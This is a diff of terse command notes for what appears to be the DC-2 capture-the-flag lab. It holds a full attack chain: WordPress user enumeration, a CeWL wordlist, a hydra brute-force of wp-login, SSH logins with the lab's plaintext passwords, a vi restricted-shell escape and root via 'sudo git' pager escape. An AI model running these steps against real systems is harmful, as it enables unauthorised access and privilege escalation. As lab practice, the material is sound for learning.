@@ -17,4 +17,89 @@ curl -LI $IP
 export URL="HTTP://$IP:80/"
 echo $URL
 
-gobuster dir -u $URL -w /usr
+gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt
+
+// use redirect to find users
+http://dc-2/?author=1
+http://dc-2/?author=2
+http://dc-2/?author=3
+http://dc-2/?author=4
+http://dc-2/?author=5
+
+nmap -p80 --script http-wordpress-users $IP
+ls
+cat users.txt
+
+cewl
+which cewl
+git clone https://github.com/digininja.CeWL
+
+cd CeWL/
+sudo gem install bundler
+bundle install
+chmod u+x ./cewl.rb
+./cewl.rb
+
+ping -c 1 $IP
+./cewl.rb dc-2
+./cewl.rb dc-2 -w ../cewl.txt
+head ../cewl.txt
+
+hydra -L users.txt -P cewl.txt dc-2 http-form-post 'wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log IN&testcookie=1:S=Location'
+
+//access tto the dashboard of wordpress
+
+ssh jerry@IP -p 7744
+adipiscing
+adipiscing
+
+ssh tom@IP -p 7744
+yes
+parturient
+
+whoami
+id
+echo $SHELL
+echo $0
+pwd
+ls -la
+cat flag3.txt
+
+cd usr
+ls -la ./usr
+export -p
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+vi flag3.txt
+
+vi
+set shell=/bin/sh
+shell
+
+echo $SHELL
+echo $0
+
+ls
+cat flag3.txt
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+echo $PATH
+whoami
+cat flag3.txt
+
+su jeryy
+whoami
+id
+
+cd
+ls -la
+cat flag4.txt
+
+sudo -l
+sudo git -p help config
+!/bin/bah
+
+whoami
+id
+cd /root
+pwd
+ls
+cat final-flag.txt
